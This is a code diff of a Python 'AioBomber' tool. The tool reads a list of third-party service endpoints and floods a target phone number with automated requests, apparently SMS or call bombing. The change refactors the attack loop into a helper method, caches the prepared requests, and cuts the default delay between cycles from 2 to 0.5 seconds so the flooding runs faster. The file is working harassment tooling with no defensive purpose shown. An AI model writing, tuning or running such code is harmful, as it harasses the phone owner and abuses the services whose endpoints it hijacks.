@@ -2,6 +2,7 @@ import asyncio
 from . import sender, preparer
 from loguru import logger
 import aiohttp
+from typing import Union
 try:
     import ujson as json
 except ImportError:
@@ -21,36 +22,31 @@ class AioBomber:
         self._loop = loop
         self._cache = {}
 
-    async def attack(self, number_of_cycles: int, phone: str, sleep_time: int = 2, path_to_service: str = None) -> None:
+    async def attack(self,
+                     number_of_cycles: int,
+                     phone: str,
+                     sleep_time: int = 0.5,
+                     path_to_service: str = None) -> None:
         logger.info('Start attack')
-        path_to_service = path_to_service or 'aio_bomber/services.json'
-        services = await self._sender.get_services(path_to_service)
+        path_to_service = path_to_service or './services.json'
+        if not len(self._cache):
+            services = await self._sender.get_services(path_to_service)
+        else:
+            services = None
         for _ in range(number_of_cycles):
-            if not len(self._cache):
-                for key, value in services.items():
-                    args = self._preparer.generate_args(value, phone)
-                    args.update({'header': value.get('header')})
-                    self._cache[key] = args
-                    self._loop.create_task(self._sender.post(**args))
-            else:
-                for value in self._cache.values():
-                    self._loop.create_task(self._sender.post(**value))
+            self._attacker(services, phone)
             await asyncio.sleep(sleep_time)
 
-    @property
-    def loop(self) -> asyncio.AbstractEventLoop:
-        return self._loop
-
-    @loop.setter
-    def loop(self, event_loop: asyncio.AbstractEventLoop) -> None:
-        if isinstance(event_loop, asyncio.AbstractEventLoop):
-            self._loop = event_loop
+    def _attacker(self, services: Union[None, dict], phone: str) -> None:
+        if not len(self._cache):
+            for key, value in services.items():
+                args = self._preparer.generate_args(value, phone)
+                args.update({'header': value.get('header')})
+                self._cache[key] = args
+                self._loop.create_task(self._sender.post(**args))
         else:
-            raise TypeError("You must pass event loop")
-
-    @property
-    def get_session(self) -> aiohttp.ClientSession:
-        return self._session
+            for value in self._cache.values():
+                self._loop.create_task(self._sender.post(**value))
 
     async def close_session(self) -> None:
         await self._session.close()
